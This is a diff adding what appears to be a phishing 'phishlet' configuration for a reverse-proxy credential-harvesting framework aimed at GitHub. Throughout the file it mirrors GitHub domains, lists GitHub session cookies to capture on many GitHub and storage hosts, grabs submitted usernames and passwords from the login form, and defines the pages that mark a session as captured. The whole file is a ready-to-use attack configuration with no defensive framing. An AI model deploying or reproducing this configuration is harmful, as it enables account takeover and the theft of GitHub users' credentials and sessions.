@@ -1,0 +1,281 @@
+author: "@francescoCer"
+min_ver: "3.3.0"
+
+proxy_hosts:
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "github.com",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "githubusercontent.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "api",
+      orig_sub: "api",
+      domain: "github.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "assets-cdn",
+      orig_sub: "assets-cdn",
+      domain: "github.com",
+      session: false,
+      is_landing: false,
+    }
+
+sub_filters:
+  # non credo necessari
+
+auth_tokens:
+  - domain: ".github.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "github.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: ".githubusercontent.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "githubusercontent.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: ".api.github.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "api.github.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "gist.github.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "assets-cdn.github.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "raw.githubusercontent.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "camo.githubusercontent.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "avatars.githubusercontent.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "central.github.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "api.github.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "github.githubassets.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "github-cloud.s3.amazonaws.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "github-production-release-asset-2e65be.s3.amazonaws.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "github-production-user-asset-6210df.s3.amazonaws.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+  - domain: "github-production-repository-file-5c1aeb.s3.amazonaws.com"
+    keys:
+      [
+        "_gh_sess",
+        "user_session",
+        "__Host-user_session_same_site",
+        "dotcom_user",
+        "logged_in",
+        "color_mode",
+        "saved_user_sessions",
+        "*regexp",
+      ]
+
+credentials:
+  username:
+    key: "login"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+
+auth_urls:
+  - "/issues"
+  - "/dashboard"
+  - "/"
+  - "/settings/profile"
+  - "/session"
+  - "/marketplace"
+  - "/explore"
+  - "/new"
+  - "/organizations"
+  - "/stars"
+  - "/events"
+  - "/topics"
+
+login:
+  domain: "github.com"
+  path: "/login"
